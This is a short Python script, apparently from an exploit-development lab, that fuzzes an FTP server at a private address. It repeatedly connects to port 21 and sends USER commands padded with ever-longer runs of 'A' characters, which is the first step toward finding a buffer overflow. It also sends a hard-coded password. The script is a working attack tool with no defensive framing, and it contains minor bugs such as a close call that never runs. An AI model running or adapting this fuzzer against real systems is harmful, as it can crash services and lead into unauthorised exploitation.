#!/usr/bin/python3

import socket
from time import sleep
from urllib import response 

buffer = b"B" * 10
x = 0

while True: 
    buff = (b"A" * x ) + buffer
    print("Fuzzing " + str(len(buff)))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect(('192.168.164.170', 21))
    response = s.recv(1024)
    print(response)
    s.send(b"USER " + buff + b"\r\n")
    response = s.recv(1024)
    s.send(b"PASS PARROTASSASSIN15\r\n")
    s.close
    x = x + 100
    sleep(2)
